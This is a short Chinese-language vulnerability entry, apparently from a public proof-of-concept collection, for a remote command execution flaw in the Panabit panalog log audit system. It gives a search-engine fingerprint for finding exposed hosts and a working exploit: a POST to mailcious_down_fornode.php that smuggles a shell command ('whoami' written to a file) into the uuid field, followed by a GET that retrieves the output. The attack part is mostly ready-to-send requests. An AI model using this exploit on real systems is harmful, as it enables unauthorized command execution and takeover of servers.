# panabit日志审计系统mailcious_down_fornode远程命令执行漏洞

# 一、漏洞简介
panalog为北京派网软件有限公司，一款流量分析，日志分析管理的一款软件。panabit日志审计系统mailcious_down_fornode远程命令执行漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ Panabit panalog

# 三、资产测绘
+ hunter`app.name="Panabit 日志系统"`
+ 特征


# 四、漏洞复现
```java
POST /mailcious_down_fornode.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36
Content-Length: 40
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: 127.0.0.1,192.168.170.105,172.10.107.143

action=check&uuid=;whoami > pobjejsh.txt
```


获取命令执行结果

```java
GET /pobjejsh.txt HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36
Connection: close
Content-Type: text/plain
Accept-Encoding: gzip, deflate
```

[panabit-mailcious-down-fornode-远程命令执行.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222233874-8275a922-bf36-45a6-b083-4536ea247db0.yaml)


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qkhnzs3bu0s8zxxn>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
